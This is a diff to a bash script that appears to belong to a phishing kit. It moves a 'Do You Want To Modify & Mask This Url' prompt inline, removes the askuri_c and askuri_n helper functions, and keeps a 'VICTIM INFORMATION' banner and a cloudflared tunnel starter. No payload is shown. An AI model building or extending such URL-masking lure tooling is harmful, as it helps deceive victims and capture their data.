@@ -63,7 +63,20 @@ logo_last
 			   echo ""
 			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================= \e[93m" 
                            echo ""
-askuri_c
+echo ""
+read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Do You Want To Modify & Mask This Url \e[1;91m (Y/N) : \e[0m' option
+echo""
+if [[ $option == *'Y'* ]]; then
+echo""
+url_shortner_c
+echo""
+fi
+if [[ $option == *'y'* ]]; then
+echo""
+url_shortner_c
+echo""
+fi
+
 clear
 logo_last
 sleep 3
@@ -89,7 +102,7 @@ logo_last
 			   echo ""
 			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================= \e[93m" 
                            echo ""
-askuri_n
+
 clear
 logo_last
 sleep 3
@@ -184,40 +197,8 @@ echo -e ""
 }
 
 
-function askuri_c() {
-echo ""
-read -p $"\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Do You Want To Modify This Url \e[1;91m (Y/N) : \e[0m" option
-echo""
-echo""
-echo""
-
-if [[ $option == *'Y'* ]]; then
-url_shortner_c
-
-fi
-if [[ $option == *'y'* ]]; then
-url_shortner_c
-
-fi
-}
 
 
-function askuri_n() {
-echo ""
-read -p $"\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Do You Want To Modify This Url \e[1;91m (Y/N) : \e[0m" option
-echo""
-echo""
-echo""
-
-if [[ $option == *'Y'* ]]; then
-url_shortner_n
-
-fi
-if [[ $option == *'y'* ]]; then
-url_shortner_n
-
-fi
-}
 
 
 start_cloudflared() { 
